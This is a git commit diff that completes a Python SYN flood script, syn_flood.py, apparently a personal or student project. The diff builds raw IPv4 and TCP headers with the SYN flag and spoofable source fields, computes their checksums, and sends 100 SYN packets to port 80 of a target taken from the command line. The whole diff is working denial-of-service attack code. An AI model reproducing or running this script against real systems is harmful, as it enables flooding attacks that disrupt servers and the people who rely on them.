595c10aac23c1659b57fd4b0d5ab0ea6bee13869
TEEPERUNA <eki.forssell@gmail.com>
2026-02-02 10:36:55 +0200

    finished syn_flood and switched names

--- syn_flood.py
+++ syn_flood.py
@@ -22,7 +22,7 @@ if len(sys.argv) != 2:
     exit()
 
 s = sc.socket(sc.AF_INET, sc.SOCK_RAW, sc.IPPROTO_TCP)
-s.setsockopt(sc.IPPROTO_TCP, sc.IP_HDRINCL, 1)  # we make IPv4 header
+s.setsockopt(sc.IPPROTO_IP, sc.IP_HDRINCL, 1)  # we make IPv4 header
 count = 0
 
 while count < 100:
@@ -33,4 +33,18 @@ while count < 100:
     iphdr += b'\x80\x06\x00\x00'    # 3rd row, TTl + PROTOL + HDR_CKSUM
     iphdr += struct.pack('>I4s', srcIP, target) # 4th and 5th row: IPv4 addrs
     # to make TCP hdr
-    tcphdr = struct.pack('>HH', srcPort, 80, random.randint(0,2**32-1), 0)
+    tcphdr = struct.pack('>HHII', srcPort, 80, random.randint(0,2**32-1), 0)
+    tcphdr += b'\x50\x02\x44\x55'    # hdr_len + SYN
+    tcphdr += b'\x00\x00\x00\x00'   # chsum + urgent_pointer
+
+    pseudo_iphdr = iphdr[12:] + b'\x00\x06\x00\x14'
+    chsum_tcp = checksum(pseudo_iphdr + tcphdr)
+    chsum_ip = checksum(iphdr)
+    tcphdr = bytearray(tcphdr)  # both headers are not mutable in python
+    iphdr = bytearray(iphdr)    # convert them into bytearrays
+    iphdr[10] = chsum_ip // 256
+    iphdr[11] = chsum_ip % 256
+    tcphdr[16] = chsum_tcp // 256
+    tcphdr[17] = chsum_tcp % 256
+    s.sendto(iphdr + tcphdr, (sys.argv[1], 0))
+    count += 1
